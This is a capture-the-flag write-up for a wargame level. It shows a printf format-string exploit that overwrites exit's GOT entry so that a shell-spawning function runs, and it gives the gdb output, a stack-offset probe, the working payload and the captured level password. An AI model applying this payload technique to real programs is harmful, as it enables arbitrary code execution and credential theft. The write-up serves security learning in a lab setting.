`main` calls `n`, there's an `o` function but it's not called (yet).

`o` only calls `system("/bin/sh")`.

`n` calls `fgets`, `printf` then exit.

Our goal is to call the function `o` with `printf %n` exploit

the start of `o` is located at **0x80484a4** and `exit` at **0x8049838**, we will put the value of `o` inside the value of `exit` to when the `n` function finishises the `o` function will be called instead of `exit`

```
(gdb) print 0x080484a4
$1 = 134513828

disass 0x80483d0
> 0x80483d0 <exit@plt>                    jmp    *0x8049838
```

**0x8049838** is the address we want

We got everything let's cook:

`(python -c 'print("\x38\x98\x04\x08" + "%13451378c%?$$n")'; cat) | ./level5`

### WAIT where can we write this ?

Quick sanity check:
(python -c 'print("AAAA" + "%p " * 15)'; cat) | ./level5
> AAAA0x200 0xb7fd1ac0 0xb7ff37d0 **0x41414141** 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070

**4th** place

`(python -c 'print("\x38\x98\x04\x08" + "%134513824c%4$n")'; cat)  | ./level5`
[after a while]
> cat /home/user/level6/.pass
> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31